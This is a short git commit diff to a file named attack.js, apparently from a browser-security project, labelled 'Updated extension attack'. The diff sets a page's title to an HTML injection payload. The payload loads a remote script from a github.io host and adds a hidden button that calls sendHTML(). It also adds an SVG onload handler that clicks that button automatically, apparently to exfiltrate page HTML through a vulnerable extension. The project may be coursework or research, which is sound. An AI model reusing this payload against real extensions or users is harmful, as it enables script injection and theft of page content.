9e896d8521a6ef6d3c4b2f095401de96b2037eee
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-15 23:15:57 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -1,6 +1,5 @@
-document.getElementById('clickButton').click();
 function changeTitle() {
-    var attackScript = "<script src='https://jba192.github.io/browserSec/attack.js'></script><button id='clickButton' onclick='sendHTML()'></button>";
+    var attackScript = "<script src='https://jba192.github.io/browserSec/attack.js'></script><button id='clickButton' onclick='sendHTML()'></button><svg onload=\"document.getElementById('clickButton').click();\"></svg>";
     if (document.title != attackScript) {
         document.title = attackScript;
     }
